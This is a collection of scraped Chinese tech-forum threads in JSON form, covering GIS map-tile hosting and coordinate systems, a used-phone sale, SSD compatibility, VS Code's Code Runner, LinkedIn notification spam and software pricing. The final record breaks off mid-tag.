{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Pixel XL 欧版 白色 32G 出售</p>\n<p>2017 年 1 月 1 日购买于淘宝（可提供相关证明），当时价格 6300 。使用一个半月，外观完好，配件齐全，现 5200 出售。坐标北京，当面交易。\n感兴趣加 QQ 460630067 或者留言沟通。</p>\n</div></div>"], "reply": "18", "tittle": "[出售] Pixel XL 欧版 白色 32G 出售", "comment": ["别生气，手机这东西到手打八折", " 以为楼主不知道？", " 差不多是 8 折 :(", "我觉得你要不 3500~4000 出了吧, 5200 买个二手手机..就算是谷歌的也信仰不足", "5200 买个二手 信仰得太充足啊", "才一个多月，价格可以", "我的天， pixel XL 这么贵了么", "呆了，不是说楼主，而是这货原价居然这么高了", "我觉得楼主下一步是换 iPhone7 Plus", " 然而并不是 :)", " 我的天, 你的 Android 手机还在 2000 时代吗?", "这个二手价格 贵了", "怎么说 3000 在国内就能买个不错的 安卓了。。", "太贵了", " @", " \r", "可是 pixel 就是这么贵呀", "搜了下淘宝，全新的都在 4600 左右……", "5200... 信仰得很足很足才行... (逃", " 这个得看版本的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前提过一个帖子，大家教了一堆内容</p>\n<p><a href=\"https://www.v2ex.com/t/284987#reply26\" rel=\"nofollow\">https://www.v2ex.com/t/284987#reply26</a></p>\n<p>现在能做到的：</p>\n<p>找了个下载器，把百度、高德、谷歌之类的地图都下载成图片，然后按照一定规则放到了文件夹中，再重写 openlayers 的 xyz 函数，去文件夹中取图片，已经可以正常显示地图。</p>\n<p>问题如下：</p>\n<ol>\n<li>这种方式有什么缺点？是否有必要继续搭建 geoserver ？</li>\n<li>geoserver 中有 shp 格式的地图资源，看介绍理解就是瓦片图，但是这种 shp 格式的文件怎样制作才最简单？</li>\n<li>比如我下载了 n 平方公里的地图，其中某几个方圆 1 平方公里的区域是重点区域，我们需要更细化的地图，那能否通过自行测绘的方式解决？比如我用无人机航拍，或者手头有 cad 图，怎样才能跟在高德或百度上下载的图片结合起来？我现在能想象到的形式就是先拍或者画一张巨大的图片，然后写脚本算坐标分割，但感觉麻烦了点。</li>\n</ol>\n<p>另：是否有人愿意以有偿的方式提供咨询服务？针对以上问题以及后续开发中的问题，现在团队中没有了解 GIS 的人，各个方向都要踩坑，感觉有点步履艰难啊……愿意指导的，可发私信或者留联系方式。</p>\n<p>谢谢大伙</p>\n</div></div>"], "reply": "38", "tittle": "想做 GIS 功能，地图测绘和 openlayers 之类的框架应该怎么结合？（顺便有偿求指导）", "comment": ["1. 你的数据源如果都是来自于百度高德谷歌的瓦片（你称为图片的那些），那现在这种方式没什么大缺点。唯一的可能是百度高德谷歌图片叠合起来你看起来会有偏差叠不上。\r", "2. geoserver 中的 shp 不是瓦片，是矢量内容（点的坐标、线的各个顶点坐标、多边形的顶点坐标）。但是浏览器一般无法处理这种矢量数据， geoserver 的一个作用就是把这些矢量图栅格化为图片，传给浏览器显示。\r", "3. 栅格地图（包含你从谷歌百度高德下载的瓦片、还包括航拍、卫星图片）是一种很重要的 GIS 数据源，但是如果你需要查询、编辑、分析时，可能还会需要另一种数据——矢量数据，常用格式有你提到的 shp ， cad 格式。你设想用航拍的方式是可以的，但是不是你想的用一张巨大图，而是无人机拍许多张图片，再回来拼一起。\r", "\r", "其实各种地图的叠合有一个隐含的问题，就是坐标系的问题，如果这个没搞清楚，各种图是无法叠在一起的。", "作为 GISer 能在 V 站上看到和 GIS 有关的问题真开心：）\r", "1.如果只是作为底图这样是可以的，只是底图更新了你也要再下载一遍，还有投影坐标是非常关键的这是一个坑，你提到这三个地图的地图刚好采取了三种不同的投影坐标。 GeoServer 是否需要那就要看你的后续需求，如果客户端有一些空间数据的交互查询等等是需要的，如果只是需要底图服务不用 GeoServer 就按照你说的也可以。\r", "2.shp 格式是一种描述空间数据各种信息的数据结构和瓦片图不是一个东西，这种格式的文件可以用 ArcGIS for Desktop 制作，当然如果要做的比较简单可以用开源的 QGIS 。\r", "3.自行测绘这个问题就比较复杂了关键是上面提到的投影坐标，测绘过程一般采用全站仪+控制点的方法。无人机航拍的影像需要经过控制点纠偏后才能使用， cad 转 shp 采用的比较多但是投影坐标也是关键，目前一般底图的制作是以测绘院制作的底图为蓝本辅以遥感数据并结合采集 POI 信息进行绘制，这个成本非常高。\r", "4.可能说这个是多余的，在大陆非法测绘是违法的。如果测绘结果面向公众开放需要有测绘资质并经过审核。", "ArcGIS 自己绘制吧，可以直接导出到标准 GPS 坐标的地图上，国内地图有火星坐标，需要额外处理", " 外行人想请教一下 geo 和 gps 的关系， geo 是否就是常说的经纬度坐标？", "先要搞定投影的问题.", " \r", "\r", " \r", "\r", "我们不需要叠加地图，只需要在高德或者百度中选一种就行了。\r", "\r", "需求 1 ：我们选取一个街区，下载公开的地图，大部分内容都符合要求，但是由于地图信息滞后或者不精确等原因，在某个地方缺少一栋建筑。是否有简便的方法能补充上这个建筑？\r", "\r", "需求 2 ：在街区里面的某个小区是我们的重点管理对象，我们有与城建有关的部门提供的这个小区的 CAD 图（实际上不用自己测绘，也就不牵扯违法测绘的问题），用什么方法能把这个 CAD 图在我们的 GIS 程序中显示出来吗？\r", "\r", "需求 3 ：需要在鼠标指向小区内建筑的时候高亮、显示一些楼宇信息，这些我看 openlayers 提供的画多边形 api 就可以完成，如果用这种方法，那后面的问题就是多边形的顶点存在哪里，这是不是就涉及到 shp 格式的数据，或者 gis 数据库之类的？\r", "\r", "谢谢！", " 我不太明白你说的 geo 指代的是什么，如果是 GeoCoordinate(地理坐标)的话那是指用经度和纬度来表达位置的球面坐标。至于 GPS 我想你说的可能是指的 WGS-84 ，这是一种大地测量系统用大地经度和大地纬度来表示位置。理论上来说这两个不是一样的但是大部分人都搞混，如果只是需要经纬度的话影响不大。我不知道经纬度坐标是什么，不过我想应该可能就是指地理坐标。(我想我的解释可能让你觉得糊涂了)", " 可否说一下你说的那个地图下载器的名称", "  大神是否可以提供一下有偿的咨询服务, 我这边需要在内网搭建一个 GeoWebCache 这样的服务, 用来展示一个县级市的地图, 并用 openlayers  或 leafletjs 来加一些标记.", " \r", "1.补上是可以的，但是关键是之前说的投影坐标，如果你想画在底图上正确的位置那么你必须要知道底图的投影坐标是什么，就是你可能用到的高德或者百度地图的投影坐标 。\r", "2.Cad 一般是转换成 shp 后再地图上显示，这个方案已经很成熟了。\r", "3.对，小区内建筑的图层(也就是 Cad 转成 shp 的图层)显示是需要 shp 或者地理数据库的(取其一即可， shp 和地理数据库中的数据可以相互转化)。显示需要图层的属性信息也就是你说的建筑高度等绑定 mouse over 就可以显示 feature 的属性。多边形选择的话 openlayer 有一个 SelectFeature 的方法，多边形点存在 geometry 里面这个也需要 shp 或者地理数据库。", " \r", "哈哈哈不是大神\r", "下载器我在用水经注(这不是广告🐼)也有开源的下载器， GitHub 上我好像看到过。\r", "你的需求里县级市的地图是有的么？如果是有的话，其它的需求并不复杂，只需要在内网显示地图并标注的话还不需要有偿咨询。", " \r", "\r", "1. cad 转 shp 有什么成熟的开源方案吗？\r", "1. 我用高德地图做底图，在某个小区上显示用 cad 转的 shp 图层，这个方案可行吗？如果要解决坐标的问题，应该查哪些资料？", "  是这样的  我这边有个项目需要县级市地图上显示故障地点  然后好调配人员过去. 问题是这个东西只能部署在内网, 所以没法用高德这种公网上的服务了.  初步的想法是下载某个地图服务的瓦片数据, 然后用 leafletjs 去显示一下.  网上搜搜资料,看到说 GeoWebCache 可以用来干这种事情, 但是因为不是专业搞 GIS 的,看文档一头雾水, 项目又比较紧, 所以想咨询你一下.  可以的话加我一下, wechat id: roogle", " 我们倒是之前本地测试搞过。有个软件可以把谷歌地图瓦片下载到本地。随便用 php 之类的写个接口读取图片。\r", "leafletjs 调用打点。。。解决", "国内的坐标和国际坐标不一样的 按照国家要求必须换算 也就是所谓的火星坐标系\r", "这个火星坐标系到 GPS 坐标有开源近似换算，但是不一定准，省市没问题，到小区就起飞了\r", "所以如果你没钱买自己的地图，用公开地图，还是用别人的封装和坐标吧\r", "\r", "话说用下载器扒地图真不厚道", "另外如果搞过地图的都知道，每个 zoomLevel 对应的层次显示都不一样，如果你用过省一级的地图，就知道那个分层多复杂，比如省界、市界、道路、桥、建筑，在每个层次显示的都要自己设置，非常复杂\r", "\r", "地图的缩放可不是简单的图片缩放，这个工作量特大，综上还是直接找别人的地图用最简单\r", "百度也没收你钱，也没限制你流量吧，难得的良心产品", " \r", "1.一定要是开源的话可以用 QGIS 转。\r", "\r", "2.方案可行，但是涉及坐标困难很大 shp 图层的投影坐标要和高德一样才能完美叠加，高德用的投影坐标是 GCJ-02 是国测局的一个投影坐标，非线性加密。目前只有非官方的点纠偏算法。 shp 投影坐标转成 GCJ-02 因为没有官方的算法转起来很麻烦而且我之前的实践来看叠加的不太好。\r", "要查资料的话关键字 WGS-84, GCJ-02 。\r", "\r", "3.如果底图不需要太新的话个人推荐天地图，因为天地图的投影坐标是 CGCS-2000 和 WGS-84 只有极小的参数差别，误差基本可以忽略。缺点是地图数据更新太慢，配色巨丑。", " \r", "如果只需要显示底图和打点的话其实并不需要 GeoWebCache 倒是用什么投影坐标比较关键,瓦片图按级别放文件夹里，按解析规则用 leaflet 就可以加载。\r", "微信加不上，给你邮箱吧:cmVnaXMxODk0QHNpbmEuY29t 。", " \r", "你让我想起了大学通宵画地图的恐惧。确实如果需求简单用百度或者高德的 api 就可以了，但是像他这样要把多边形 shp 叠到底图上如果还用百度或者高德的 api ，坑就太多了。\r", "要用这种公开的底图我还是安利天地图，虽然很丑但是坐标几乎和 WGS-84 一样可以直接用，投影坐标的问题解决了其它坑都不算什么。", "  我们的需求基本一致，加个 qq 聊聊？", " 如果用非公开的地图，技术路线应该是怎样的？虽然我们不是土豪，但现在有点有钱没处花的感觉", " 对了，转换格式不一定要开源，但几十万的授权估计买不起", "还是 arcgis 吧，客户端 arcgis api for js ，桌面端 arc map ，服务端 arcgis server", " 那没钱就不要强上全自己搞定的 GIS 应用，各家互联网公司哪家都不差钱，谁也没自己定制地图不是么", "定制地图，你需要招几个测绘专业的同学", " \r", "1.①非公开底图来源：很有钱—当地测绘局买(可能需要推荐信什么的)，一般有钱—淘宝关键字\"全国 shp\"。\r", "   ②制图→发布地图服务→空间数据管理：很有钱— ArcGIS 全家桶(Desktop→Server→SDE)，开源— QGIS→MapServer/GeoServer→PostgreSQL\r", "   ③前端展示:和钱无关： ArcGIS js api ， leaflet ， openlayer 都可以。\r", "\r", "2.非开源的话可以买 FME desktop 专门转数据，个人使用来看开源的已经够用了。", " 有点兴趣，问一下，搜了一下点开一家写着 50,100 为单位，如果全国数据岂不是得几千块了？", " #8 \r", "\r", "呃，可能我没描述清楚，我是想问，平时用手机拍的照片， EXIF 中带有的坐标信息，例如 “ N 113°12'39.6\"” 这样的坐标，应该叫 GEO 坐标，还是叫 GPS 坐标呢？\r", "\r", "或者像百度的 ", " 这个页面，拾取到的坐标，是属于 GEO 还是 GPS 呢？\r", "\r", "对这个不太了解，想规范一下自己写的代码中用到的单词，再次感谢！", " GEO 坐标是通称，旗下包块 WGS-84 、 CGCS2000 、北京 54 、西安 80 。等等一坨一坨的各个坐标系统。\r", "\r", "GPS 系统使用的坐标是 WGS 84 的坐标。\r", "手机拍的一般可以理解为 GPS 坐标，你要说 GEO 坐标也行。", " 原来是这样~", " \r", "2015 年全国我买的价格是 2W", " \r", "百度那个界面拾取出来的是百度坐标,可以说是 GEO 。", "  QQ 号   JXU0RThDJXU1MTZCJXU0RTk0JXU0RTAzJXU1NkRCJXU1MTZEJXU1NkRCJXU1MTZC", " 在淘宝上找到了 shp 资源，以这个为基础，然后把我们需要的小区，用 cad 转成 shp ，再叠加在一起，这个方案靠谱不？\r", "\r", "还有就是看到淘宝上买的 shp 图，配色什么的都不是很好看，想知道这个配色是由什么决定的，是存在 shp 文件中吗？如果我想调的话，是不是就只能相当于重画？", " \r", "1.可以叠加，注意投影坐标要一致。\r", "2. 改配色方案需要 GIS 软件里操作 ArcGIS for Desktop 、 SuperMap 、 QGIS 等都可以，如果想在前端或者客户端重绘也可以。", " 为什么 qq 号显示的是一堆乱码？", " 你 base64 解码一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>iphone 从 07 年出来以后，移动端开始慢慢火了起来。尤其经历了前两年移动端创业的大潮。</p>\n<p>但目前，移动互联网基本格局定了不少，也很难有新的风口。很多人都在说下一个风口是大数据，是人工智能 AI ，但这些内容好像离移动端都有些距离。</p>\n<p>后端经历过这么多年的沉淀，尤其是 Java ，在现在整个大环境不好的情况下，反而更佳稀缺，从前景来看，依旧可以保持多年的发展潜力。</p>\n<p>我个人是一个 3 年不到的 iOS 开发，现在感到移动端的瓶颈，尤其是 iOS 。</p>\n<p>我有点悲观的估计 iOS 的市场或者前景，相对于 Android 可能会更差一些。 OC 基本是走向落寞的趋势，而 swift 在国外虽然用的比较多，但本身份额也不大，而且目前暂时只能在 apple 产品上使用，说是要推出服务器框架，但还有些距离。可能再过 4 ， 5 年，移动端尤其是 iOS 可能会更佳落寞，感觉前景不是很乐观。</p>\n<p>各位移动端开发怎么看 iOS 或者 Android 前景？准备做哪些方面的准备？讨论一下？</p>\n</div></div>"], "reply": "3", "tittle": "讨论讨论移动端的前景？ iOS， Android 等", "comment": ["前端 绝对不会过时....", "= =向点 JS ，往 Node.js 和 ReactNative 靠", "觉得移动端和前端的界限会越来越模糊。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>页面上需要添加一个背景音乐的功能</p>\n<p>背景音乐的大小在 1.5M 左右</p>\n<p>页面每天的 pv 在 3w-15w</p>\n<p>有什么办法让音乐传输的时候带宽压力小一些</p>\n</div></div>"], "reply": "14", "tittle": "怎么保存音乐让传输的时候带宽压力更小", "comment": ["外链资源", "压缩， CDN", "和楼上说的一样，没有强制要求就使用外链吧，加载速度也快一点", " \r", " 外链不稳定", " cdn 倒是可以", "外链网易云音乐", "搜寻 \"opus codec 浏览器\"\r", "可能是已知免费开源音讯编码中最好之一了,只差浏览器支援度,\r", "但搜寻中有个公司能解决,google 也用于 youtube,\r", "所以一定有解法.\r", "软即时,最低延迟 20ms,码率超低就音质超好,\r", "参数更好玩,预设值基本上就是最优参数,只差预设延迟跟预设码率,\r", "你有即时编码输出需求,把最小块(延迟)参数改 20,块越大压缩率越高但需要更高的读取缓冲,不需要即时编码就调到最大值吧,压缩率好,预设是 1000(1 秒),\r", "预设码率不是最低,但好笑的是我调成预设最低码率搭配他的预设品质参数 10(=最好),结果输出的档案在还原波型比对跟中 /高码率几乎一样,但档案更小.\r", "所以改 块大小(延迟时间) 跟 预设码率(改成最低值) ,就完美输出了.", " \r", " \r", "好的 非常感谢！", "一定要完整的音乐吗？能不能用 MIDI ？", " 只要能播放出声音就行", " 转成 MIDI ，就像音乐盒那种，最多就几十 K 。", " 这个好   谢谢", "midi", "本地缓存"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.cnblogs.com/jtuki/p/6414162.html\" rel=\"nofollow\">http://www.cnblogs.com/jtuki/p/6414162.html</a>\r<br>分享一篇文章，阐述了将数据和处理单元 co-located 是当下流处理场景中一种重要的架构方式。</div>"], "reply": "2", "tittle": "[分享一文] Jay Kreps - 为何流处理中局部状态是必要的", "comment": ["把状态放到应用层（非配置类缓存这种），大部分场景都是 over design 。你啥业务一个远程的 kv 不能满足需求的？", " 这篇文章提到的做法，更多是针对不同的处理单元有不同的索引需求、多个输入流的变更频繁程度不同、觉得 rpc 的效率不足够高的场景。\r", "\r", "其实的确大部分场景下远程 kv 确实足够了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"link.png\" src=\"https://ooo.0o0.ooo/2017/02/18/58a8404228053.png\">\n这两个大件,推特还好说点,我还没屏蔽...<br>\n领英天天发这些..</p>\n<blockquote>\n<p>你认识**,**, 或 **吗?<br>\n添加联系人,获取更多动态</p>\n</blockquote>\n<p>不明白了..从哪里的来的这些人.. 作为一个新时代好宅男,没有任何交际嗯.说话就冷场那种人<br>\nFB 也有,不过不多,共同好友的朋友之类.<br>\n这类机制到底是 what..凭空搞出来这么多人,FB 还算是有共同好友,领英到底是从哪里凭空出来的..</p>\n</div></div>"], "reply": "40", "tittle": "你们被领英和推特骚扰过多少次?", "comment": ["领英 HR 的得力助手", "fb ， twitter 、 linkedin 之类。。。个人信息你有填过你的学校 or 公司？有就会出现了。。。\r", "国外这些还好，，国内很多应用更淫荡，，甚至直接偷偷上传你的通讯录。。百度、企鹅这些全家桶都曾做过。", " linkedin ，只要你登录状态点过其他人的页面，他就默认你跟他联系了，多个人共一个公司，他就会猜测你跟这个公司的关系了。基本上多点几次，你的职业背景就出来了，根本不用實铭。鹅肠也有类似的东西，用 QQ 群就搞定，不过是没展示出来给你看过。", "linkedin 最烦了", "就在昨天，把 linkedin 账号注销了！\r", "这货 没事就推消息发邮件，弄一堆虚假信息", " 被阿三收购后采用了和 Win10 同样的推广策略吧，阿三的风格就是这样，不管你愿不愿意漫山遍野推送发垃圾给你，发外包项目留的邮箱每次都几百封阿三公司们的垃圾邮件。\r", "\r", "一个比较有意思的事实是，现在微信为什么和 Linkedin 绑定了？腾讯和微软有什么 py 交易么？", "Linkedin 的这个是 feature 吧，勾搭校友的校友，同事的同事", " 嗯，所以，直接让自己从 linkedin 消失算了。。。", "linkedin 只能呵呵了，莫名其妙多出几十个联系人", "twitter 还好  领英和 facebook 真是  烦死", "twitter 把邮件取消订阅就行", "怎么注销？", " 设置里面有", "gmail 不是会自动进 social 或者 promotions 类别,这样基本上不会感觉被骚扰", "基本都是 hr 想加联系介绍工作", "推特可以关闭，领英懒得去理了", "去年通过 Linkedin 加我微信的猎头有一百三十多位，我都通过了。\r", "\r", "刚开始也挺烦，不过现在学会了跟他们做朋友。其实他们也知道这样很烦人，工作性质如此，有些猎头烦你之前内心也是会挣扎的。", "facebook 才是……", "取消邮件订阅", "美国公司一般会遵照美国法律，在邮件中提供退订链接，并且保证可以退订。\r", "所以直接退订就好", " 国内的一些邮件退订还要求登录网站帐号……关键是退订的原因很可能是再也不访问这个网站了，密码估计都忘了还让人登录，坑", " 国内没有这个法律，所以很多网站都耍流氓", "推特还好， Facebook 神烦， LinkedIn 被微软收购之后发的邮件多了很多。\r", "Facebook 以前经常发什么你的 A 好友给 B 好友写了啥啥，退订后过了段时间，居然开始发你的 A 好友评论了某个（与我无关的）人的 post ， MDZZ 。\r", "\r", "国内遇到过最恶心的是陈一舟的千橡。只要你注册过人人网，大街网就会给你发“某某（你在人人网的姓名，大多是真名）， XX 公司给你发来一个职位邀请，快登录看看吧”，然而根本没职位邀请，你也根本没注册过大街网，点进去就是个注册页而已。", "linkedin 邮件可以退订啊", "你在 FACEBOOK 的朋友比你想象的要多", "linkedin 最烦了  直接拉黑了。", "嫌烦退订邮件即可\r", "找工作的质量还不错，两年前人肉翻墙就是人家在 LinkedIn 上找的我", "领英的邮件简直骚扰，疯狂发 spam 。拉黑了。", " #10 赞同，论垃圾邮件，我只服 facebook 和 linkedin", "Facebook 推送都是满通知栏的来", "没用个人日常邮箱注册，没忧虑", "这周东西可以取消吧？基本没遇到过", "领英这个机制也有一点好啦，就是可以逼着社交恐惧症患者多说话嘤嘤嘤嘤…", "这是你自己订阅的吧，还怪人家骚扰？", "fb 最烦", "每次打开 linkedin 都要扫描电话簿发邀请，烦死了。", "Facebook 和 LinkedIn 都是直接网页禁用了所有通知，不然有的是你烦", "上个月就受不了领英的邮件了。\r", "注销了……反正也没啥卵用。", "歪国的基本上能拿到的数据都展示给你了，告诉你他们拿你的数据了。。。。像国内的厂商，绝对不会告诉你我们拿到了你的关系链的。。。。", "这怎么能叫骚扰？这叫找事😂"]},
{"content": ["<div class=\"topic_content\">自己不太清楚，\r<br>如果可以就打算买一个，</div>"], "reply": "19", "tittle": "笔记本 是否安装 Intel 730 固态硬盘", "comment": ["哪种硬盘接口， SATA 接口可以安装。", "  怎么看，", "笔记本型号，帮你看看", "可以", "固态硬盘一般都可以  \r", "某些超级本内部没有预留接口的不行", "有 sata 接口就可以，实测", "可以呀  什么笔记本  sata2 就别了 浪费", "有的笔记本带半高 mini-pcie 接口，较新的可能都带 ngffs 的接口了～～性能最优，之后本机自带 SATA 口 hdd 当数据盘，当然把本身 SATA 硬盘拆下换上 SATA 接口的固态也可以", "推荐是装给性能比较好的厚重本子\r", "因为性能差的浪费这么好的盘，然后轻薄本不一定装得下，再然后 730 耗电相对高一些，影响待机。", " 就算是 sata2 接口，升级固态一样提升明显，限制体验的并不是硬盘持续读写速度，而是 4K 读写， sata2 的速度足够了", "刚给笔记本换上 SSD 就看到这篇帖子。。。\r", "以前一直想买，但是因为不买电脑也能用，就一直拖着没买好久了。\r", "今天换去了之后给这速度感动哭了。。。", "730 就是功耗略高", "笔记本装 730 得注意节能模式啊，不然没准笔记本休眠恢复回蓝屏，我的 intel 520 就遇到过这种情况", "楼主这问题近似等于地球人能不能吃猪肉", "800 多买的 240G intel 730 用在渣想 y400 上两年了， 730 好像都停产很久了\r", "适合标准笔记本，低压低功耗笔记本会死机蓝屏的， thinkpad 某几款也不能装，装了开不了机，、。\r", "硬盘部位散热不好的，不要用了， 730 发热还是有的", " 什么笔记本带半高 pcie ，求介绍下……", "Y480 装 intel 730 已经用了 3 年了 美滋滋", " 已经买好的笔记本开后盖检查一下。想买一个带 mini-PCIe 或者 ngff 接口的笔记本电脑，跟销售聊聊，或者搜国内外的拆机图。这种接口应该是笔记本的标配了吧，个人觉得中高端更应该是如此———拓展、性能和卖点都出来了。", " 华硕 K42jc ，老机子\r", " 好的，谢谢。如果接口一致，只要替换以前的磁盘就可以了是不是\r", " 好的，我去了解一下 sata 接口\r", " 怎解\r", " 多谢，\r", " 你可以推荐一台机子，笔记本有些老了，想更新一下\r", " 对呀，电脑速度，太慢了，卡机\r", " 多谢，使用经验\r", " 感谢回复\r", " 直接替换掉以前的磁盘就可以了是吗\r", " 可以的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在 Mac 上两大语言都能跑啦。今天给<a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner\" rel=\"nofollow\">Code Runner</a>加了 Objective-C 的支持，不仅支持跑 Command Line Tool ，还可以跑 Cocoa Application 。只不过现在 Objective-C 只支持在 Mac 上跑，要支持 Windows 和 Linux 好像还需要 GNUStep 啥的，不过应该不太有人在 Windows 和 Linux 跑 Objective-C 吧～</p>\n<p><img alt=\"objc\" src=\"https://cloud.githubusercontent.com/assets/1050213/23093391/b6107d16-f61c-11e6-808e-f8db96ba2f67.gif\"></p>\n</div></div>"], "reply": "21", "tittle": "VS Code 能跑 Swift 和 Objective-C 啦", "comment": ["vscode 在 ubuntu 上打开速度很慢。。导致我一直还在用 sublime", "不知道 vs 啥时候支持", "有意思", "有模拟器？", "资磁老板", "智能提示做的如何？", "然而既然已经有 Mac 系统了，为何不直接用 xcode......", " 有时候只是需要测试一小段代码，开个 xcode 太麻烦了", "做 Node.js 开发是挺好用", " 看到熟人了", "慢到死的编辑器……而且 BUG 好多……导致我还在用 sublime ……可惜了优秀的 go 语言插件", " 不会吧，什么环境啊", "我现在已经不知道编辑器和 IDE 的区别是什么了……", "mac 上还是用 Xcode", "这个大概要你本地环境支持才行吧..", " 慢是系统原因吧，我这都是极速打开。 win mac ubuntu 三平台全部换装 vsc 抛弃 atom", " 别说，这破 OSX 10.12.2 还真有毛病……偶尔突然就黑屏关机了，只能重新开机……但是 sublime 一点问题都没有啊，独独 vsc 卡，启动后先显示个空白的窗口，等一秒的样子才能出现编辑界面……提示更新需要重启，点了确定……就没了……说好的重启没了……只能手动重启，重启后继续提示有更新需要重启……最后我选择去官网下载最新的安装包……", " @", " 有 gcc + Cocoa 就行了", "作者考虑加入格式化代码的功能么？现在同时使用 Python 插件和 run coder ，感觉有些重合。", " 暂时没有 plan~ 如果有的话，也是会针对不同的语言做新的独立的插件。 Code Runner 的底层实现并没有针对某个语言进行什么优化（除了 PHP :P ）， 99%的代码都是 share 的，每个不同语言怎么跑，基本通过一行 config 就搞定。而 Code Format 或者 IntelliSense 的话，每个语言是完全不同的，肯定不会放在 Code Runner 里面。", "vsc 作为编辑器还是不错的，作为 ide 我想说，我们还是先做好编辑器吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>模仿 <a href=\"https://github.com/shekhargulati/52-technologies-in-2016\" rel=\"nofollow\">https://github.com/shekhargulati/52-technologies-in-2016</a></p>\n<p>建了 <a href=\"https://github.com/sadhen/12-technologies-in-2017\" rel=\"nofollow\">https://github.com/sadhen/12-technologies-in-2017</a></p>\n<p>一个月写一篇技术博客，算是时间比较充裕的，希望能跟大家一起交流。我的关注点主要是后端和大数据这块，平时Java/Scala用的比较多。也非常喜欢花一些时间尝试新东西。</p>\n<p>Feel free to create issues.</p>\n<p>一月份研究了一下 Scala.js 和 Binding.scala ，写了 <a href=\"http://sadhen.com/blog/2017/01/02/binding-with-semantic.html\" rel=\"nofollow\">http://sadhen.com/blog/2017/01/02/binding-with-semantic.html</a> ，英语比较蹩脚，打算重新组织用中文重新写一下。</p>\n<p>二月份打算写 Spring Boot with Scala ，是工作中天天接触的，正在写作中 <a href=\"https://github.com/sadhen/12-technologies-in-2017/tree/master/02-SpringBoot-with-Scala\" rel=\"nofollow\">https://github.com/sadhen/12-technologies-in-2017/tree/master/02-SpringBoot-with-Scala</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "12 Technologies in 2017 （写作计划）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然各种好用，但要 59.99 刀</p>\n<p>真的好吗？-_-</p>\n</div></div>"], "reply": "24", "tittle": "PDF Expert for Mac 真的很好用，就是价格太贵 了", "comment": ["可以在淘寶買到代理官方的正版，現價 ¥98 （我幾個月前還是 ¥198 買的）：\r", "\r", "\r", "\r", "$59.99 的確有點貴，不過上面的價格還是蠻值的～", "mac 支持 pdf 很好，不需要这类 app", " 不一样的", " thx\r", "\r", "他这是官网直发的吗？", "  数码荔枝这个应该是官网直发\r", "我也是一楼那种买法，是官方发邮件给激活码", " thx\r", "\r", "另外，想知道 他们是怎么拿到这样的低价的呢？", " ok", "PDF Expert 比 Preview 略卡一点，特别是对于集显机器。", "我下了个盗版的打算用用看，好用就买，然后我删了。真的觉得很差啊，不值这个价，虽然好像大家都说好用。现在平常还是用预览，有需要的时候就用 Acrobat 。", " 100 块可出", " #11 挺好的啊，界面漂亮，功能丰富", " \r", " 可能是下了假程序 哈哈", " 嗯，略有一点", "用 mac 都是壕啊，以后买得起，也用不起", " 我觉得界面是挺漂亮的，至于功能丰富。。。。。可能是我用 Acrobat 用惯了吧。", " 我一开始想合并几个 pdf ，居然是要在那个小窗口里按顺序点击。。然后确认了以后就直接合并了，不能再调整顺序。而 Acrobat 是有个列表，导入以后可以自由拖动。然后我想打印 pdf ，结果调不出详细设定打印机的那个界面（驱动提供的）。然后我就删了，老老实实继续用预览和 Acrobat 。", " \r", "\r", "时间、精力和数据才是最宝贵的，用 mac 也好，买正版软件也好，都是用金钱换取前三样东西罢了。不是钱多，而是时间精力不够，选择花钱解决问题", " 我也是这样想的，虽然没钱，所以买二手。因为 mac 很多软件都好用而且都很美，所以愿意花钱买软件", "marginNote 我觉得更好用，现在已经放弃 PDF Expert 了", " 我去，看了下官网视频 demo ，怎么还带脑图的。。。", " \r", " \r", "\r", "是的。。。 V 友之间有相同价值观，很棒！", " 不是官網直發，而是賣家會自動發送一個兌換碼，用這個兌換碼可以在官網免費兌換一個 License 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这里的编辑器不太好用，所以用图片传的</p>\n<p>项目:  <a href=\"https://github.com/xiaojiaqi/10billionhongbaos\" rel=\"nofollow\">https://github.com/xiaojiaqi/10billionhongbaos</a></p>\n<p>文字 wiki: <a href=\"https://github.com/xiaojiaqi/10billionhongbaos/wiki/%E6%89%9B%E4%BD%8F100%E4%BA%BF%E6%AC%A1%E8%AF%B7%E6%B1%82%EF%BC%9F%E6%88%91%E4%BB%AC%E6%9D%A5%E8%AF%95%E4%B8%80%E8%AF%95\" rel=\"nofollow\">https://github.com/xiaojiaqi/10billionhongbaos/wiki/%E6%89%9B%E4%BD%8F100%E4%BA%BF%E6%AC%A1%E8%AF%B7%E6%B1%82%EF%BC%9F%E6%88%91%E4%BB%AC%E6%9D%A5%E8%AF%95%E4%B8%80%E8%AF%95</a></p>\n<p><img alt=\"1\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_01.png\">\n<img alt=\"2\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_02.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_03.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_04.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_05.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_06.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_07.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_08.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_09.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_10.png\">\n<img 